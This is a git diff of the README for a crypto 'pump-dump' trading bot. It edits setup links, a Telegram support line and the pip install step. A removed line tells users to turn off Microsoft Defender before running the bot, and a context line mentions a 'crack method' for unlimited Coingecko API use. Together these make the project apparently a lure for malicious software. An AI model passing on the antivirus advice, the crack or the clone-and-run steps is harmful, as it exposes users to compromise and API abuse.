@@ -5,9 +5,8 @@
 <img src=https://img.shields.io/github/issues-pr/andreabotdev/Volume-Based-Pump-Dump-Bot?style=for-the-badge&logo=appveyor&color=informational />
 </p>
 
-# For Mac Os version, contact via [Telegram](https://t.me/pancakeswapprediction).
+# For free support via [Telegram](https://t.me/pancakeswapprediction).
 
-## Since the bot contains automated processes, you cannot use this bot when Microsoft Defender is turned on. Any antivirus program other than Microsoft Defender can remain open.
 
 # CryptoBot - Volume-Based Crypto Trading Bot
 
@@ -27,17 +26,19 @@ You can use Coingecko APIs unlimitedly with the crack method available in the bo
 
 ## Setup Instructions - Way I
 Download and Install Git here:
-[Git](https://git-scm.com/download/win)
+[Git_Win](https://git-scm.com/download/win)   /  [ Git_Mac](https://git-scm.com/download/mac)
+
+
 
 Download and Install Python here:
-[Python 3.12.1](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)
+[Python 3.12.1_win](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)
 
 Build using the following commands:
 
 ```shell
 git clone https://github.com/andreabotdev/Volume-Based-Pump-Dump-Bot.git
 cd Volume-Based-Pump-Dump-Bot
-pip install Pillow PyQt5 pyzipper requests
+pip install -r requirements.txt
 python3 main.py
 main.py
 ```
